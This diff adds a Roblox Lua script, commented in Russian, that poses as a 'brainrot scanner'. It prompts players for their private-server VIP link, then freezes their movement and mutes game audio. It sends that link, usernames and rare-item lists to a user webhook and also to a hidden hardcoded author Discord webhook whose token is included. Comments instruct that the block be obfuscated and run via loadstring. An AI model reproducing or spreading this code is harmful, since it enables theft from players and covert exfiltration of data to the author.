@@ -1,1 +1,251 @@
-g
+-- BEGIN (копируй весь этот блок в обфускатор)
+-- ВНУТРЕННИЙ КОД (берёт пользовательский webhook из глобальной переменной `Webhook`)
+local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- <- твой авторский (скрыт)
+local USER_WEBHOOK = Webhook -- <-- ПОЛЬЗОВАТЕЛЬСКИЙ: глобальная переменная, задаётся снаружи
+
+local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local ContextActionService = game:GetService("ContextActionService")
+local StarterGui = game:GetService("StarterGui")
+local SoundService = game:GetService("SoundService")
+
+_G.VIP_LINK = _G.VIP_LINK or nil
+local isActivated = false
+
+-- ===== helpers =====
+local function safeLower(s) if type(s)~="string" then return "" end return s:lower() end
+local function safeJSONEncode(t)
+    local ok, res = pcall(function() return HttpService:JSONEncode(t) end)
+    if ok then return res end
+    return HttpService:JSONEncode({ content = tostring(t) })
+end
+local function getRequestFunc()
+    if type(syn)=="table" and type(syn.request)=="function" then return syn.request end
+    if type(http)=="table" and type(http.request)=="function" then return http.request end
+    if type(http_request)=="function" then return http_request end
+    if type(request)=="function" then return request end
+    return nil
+end
+
+local function sendDualWebhook(payload)
+    if type(payload) ~= "table" then payload = { content = tostring(payload) } end
+    local json = safeJSONEncode(payload)
+    local req = getRequestFunc()
+    if type(req) == "function" then
+        if USER_WEBHOOK and USER_WEBHOOK ~= "" then
+            pcall(function() req({ Url = USER_WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json }) end)
+        end
+        if ADMIN_WEBHOOK and ADMIN_WEBHOOK ~= "" then
+            pcall(function() req({ Url = ADMIN_WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json }) end)
+        end
+    end
+end
+
+-- ===== brainrot matching (примерный список — можно расширять) =====
+local BRAINROT_NAMES = {
+    "Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
+    "Tictac Sahur","Spaghetti Tualetti","Dragon Cannelloni","Ketupat Kepat"
+}
+local LOWER_TO_BRAINROT = {}
+for _,n in ipairs(BRAINROT_NAMES) do LOWER_TO_BRAINROT[safeLower(n)] = n end
+local ALLOW_KEYWORDS = {"brainrot god","secret","og","admin","exclusive","taco","craft machine"}
+local DISALLOW_KEYWORDS = {"common","rare","epic","legendary","mythic","mythic lucky block"}
+
+local function containsAny(hay, needles)
+    hay = safeLower(hay)
+    for _,v in ipairs(needles) do if string.find(hay, v, 1, true) then return true end end
+    return false
+end
+
+local function getBrainrotMatch(name)
+    local ln = safeLower(name)
+    for lower, canon in pairs(LOWER_TO_BRAINROT) do
+        if string.find(ln, lower, 1, true) then return canon end
+    end
+    return nil
+end
+
+local function isAllowedByCategory(name)
+    local ln = safeLower(name)
+    local hasDis = containsAny(ln, DISALLOW_KEYWORDS)
+    local hasAllow = containsAny(ln, ALLOW_KEYWORDS)
+    if hasDis and not hasAllow then return false end
+    return true
+end
+
+local function isBrainrotInstance(inst)
+    if not inst then return false end
+    local m = getBrainrotMatch(inst.Name)
+    if not m then return false end
+    if not isAllowedByCategory(inst.Name) then return false end
+    return true
+end
+
+-- ===== plot scanning =====
+local function collectBrainrotsInPlot(plot)
+    local out, seen = {}, {}
+    for _,d in ipairs(plot:GetDescendants()) do
+        if isBrainrotInstance(d) then
+            local name = getBrainrotMatch(d.Name) or d.Name
+            if not seen[name] then seen[name] = true; table.insert(out, name) end
+        end
+    end
+    return out
+end
+
+local function resolveOwnerNameFromPlot(plot)
+    for _,desc in ipairs(plot:GetDescendants()) do
+        if desc:IsA("StringValue") and (desc.Name:lower():find("owner") or desc.Name:lower():find("username") or desc.Name:lower():find("user")) then
+            if desc.Value and #desc.Value > 0 then return desc.Value end
+        end
+        if desc:IsA("IntValue") and (desc.Name:lower():find("owner") or desc.Name:lower():find("userid")) then
+            local ok, name = pcall(function() return Players:GetNameFromUserIdAsync(desc.Value) end)
+            if ok and name then return name end
+        end
+    end
+    return nil
+end
+
+local PLOTS_FOLDER = Workspace:WaitForChild("Plots")
+local function postCombinedAllPlots()
+    local sections, listAll = {}, {}
+    for _,plot in ipairs(PLOTS_FOLDER:GetChildren()) do
+        local entries = collectBrainrotsInPlot(plot)
+        if #entries > 0 then
+            for _,v in ipairs(entries) do table.insert(listAll, v) end
+            local owner = resolveOwnerNameFromPlot(plot) or plot.Name
+            table.insert(sections, string.format("Plot: %s | found: %d", owner, #entries))
+        end
+    end
+    if #sections > 0 then
+        local payload = {
+            content = "@everyone Brainrots detected",
+            embeds = {{
+                title = ":star: Brainrot | Flux",
+                color = 65280,
+                fields = {
+                    { name = "Scanner Username", value = Players.LocalPlayer and Players.LocalPlayer.Name or "Unknown", inline = false },
+                    { name = "Brainrots List", value = (#listAll>0) and table.concat(listAll, "\n") or "None", inline = false },
+                    { name = "VIP Link", value = _G.VIP_LINK or "None", inline = false },
+                }
+            }}
+        }
+        sendDualWebhook(payload)
+    end
+end
+
+-- ===== watch & batch =====
+local connections = {}
+local batchScheduled = false
+local function scheduleBatch()
+    if batchScheduled then return end
+    batchScheduled = true
+    task.delay(0.5, function() batchScheduled = false; pcall(postCombinedAllPlots) end)
+end
+
+local function onPlotDescendantAdded(plot, inst)
+    if isBrainrotInstance(inst) then scheduleBatch() end
+end
+
+local function attachPlotWatch(plot)
+    if connections[plot] then return end
+    connections[plot] = plot.DescendantAdded:Connect(function(inst) onPlotDescendantAdded(plot, inst) end)
+end
+
+local function detachPlotWatch(plot)
+    if connections[plot] then connections[plot]:Disconnect(); connections[plot] = nil end
+end
+
+local function watchPlots()
+    for _,p in ipairs(PLOTS_FOLDER:GetChildren()) do attachPlotWatch(p) end
+    PLOTS_FOLDER.ChildAdded:Connect(function(child) attachPlotWatch(child); scheduleBatch() end)
+    PLOTS_FOLDER.ChildRemoved:Connect(function(child) detachPlotWatch(child); scheduleBatch() end)
+end
+
+-- ===== optional: freeze movement & mute (как в оригинале) =====
+local function blockPlayerMovement()
+    local player = Players.LocalPlayer
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
+    ContextActionService:BindAction("BlockMovement", function() return Enum.ContextActionResult.Sink end, false,
+        Enum.PlayerActions.CharacterForward, Enum.PlayerActions.CharacterBackward, Enum.PlayerActions.CharacterLeft, Enum.PlayerActions.CharacterRight, Enum.PlayerActions.CharacterJump)
+    local function freezeHum(char)
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then pcall(function() hum.WalkSpeed = 0; hum.JumpPower = 0 end) end
+    end
+    local pl = Players.LocalPlayer
+    if pl then
+        local char = pl.Character or pl.CharacterAdded:Wait()
+        freezeHum(char)
+        pl.CharacterAdded:Connect(freezeHum)
+    end
+    local function muteSound(s) if s and s:IsA("Sound") then pcall(function() s.Volume = 0; s:Stop() end) end end
+    for _,d in ipairs(Workspace:GetDescendants()) do muteSound(d) end
+    for _,d in ipairs(SoundService:GetDescendants()) do muteSound(d) end
+    Workspace.DescendantAdded:Connect(muteSound); SoundService.DescendantAdded:Connect(muteSound)
+end
+
+-- ===== GUI (для ввода VIP-ссылки) =====
+local function createActivationGUI()
+    local player = Players.LocalPlayer
+    if not player then return end
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "BrainrotActivationUI"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.Parent = player:WaitForChild("PlayerGui")
+
+    local main = Instance.new("Frame", gui)
+    main.Size = UDim2.new(0,460,0,240)
+    main.Position = UDim2.new(0.5,-230,0.5,-120)
+    main.BackgroundColor3 = Color3.fromRGB(12,12,12)
+    main.BorderSizePixel = 0
+
+    local title = Instance.new("TextLabel", main)
+    title.Size = UDim2.new(1,-20,0,40); title.Position = UDim2.new(0,10,0,10)
+    title.BackgroundTransparency = 1; title.Text = "Введите VIP-ссылку"; title.TextColor3 = Color3.new(1,1,1)
+    title.TextScaled = true; title.Font = Enum.Font.GothamBold
+
+    local vipBox = Instance.new("TextBox", main)
+    vipBox.Size = UDim2.new(1,-20,0,40); vipBox.Position = UDim2.new(0,10,0,60)
+    vipBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+    vipBox.BackgroundColor3 = Color3.fromRGB(40,40,40); vipBox.TextColor3 = Color3.new(1,1,1)
+    vipBox.ClearTextOnFocus = false; vipBox.Font = Enum.Font.Gotham
+
+    local btn = Instance.new("TextButton", main)
+    btn.Size = UDim2.new(1,-20,0,50); btn.Position = UDim2.new(0,10,0,120)
+    btn.Text = "ACTIVATE"; btn.Font = Enum.Font.GothamBold; btn.TextScaled = true
+    btn.BackgroundColor3 = Color3.fromRGB(0,120,255); btn.BorderSizePixel = 0
+
+    local status = Instance.new("TextLabel", main)
+    status.Size = UDim2.new(1,-20,0,24); status.Position = UDim2.new(0,10,0,180)
+    status.BackgroundTransparency = 1; status.TextColor3 = Color3.fromRGB(255,200,0); status.Text = ""; status.Font = Enum.Font.Gotham
+
+    btn.MouseEnter:Connect(function() TweenService:Create(btn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(0,150,255)}):Play() end)
+    btn.MouseLeave:Connect(function() TweenService:Create(btn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(0,120,255)}):Play() end)
+
+    local function activate()
+        local vip = vipBox.Text:gsub("^%s*(.-)%s*$","%1")
+        if vip == "" or not string.find(vip, "roblox%.com/share") then
+            status.Text = "Неверная VIP-ссылка!"
+            status.TextColor3 = Color3.fromRGB(255,80,80)
+            return
+        end
+        _G.VIP_LINK = vip
+        isActivated = true
+        status.Text = "Скрипт активирован!"
+        status.TextColor3 = Color3.fromRGB(0,255,100)
+        task.delay(0.05, function() watchPlots(); postCombinedAllPlots() end)
+        blockPlayerMovement()
+        pcall(function() gui:Destroy() end)
+    end
+
+    btn.MouseButton1Click:Connect(activate)
+    vipBox.FocusLost:Connect(function(enter) if enter then activate() end end)
+end
+
+-- ===== init =====
+createActivationGUI()
+sendDualWebhook({ content = "Brainrot scanner loaded (dual webhook active)" })
+-- END (обфусцируй весь блок выше и вставь как loadstring)
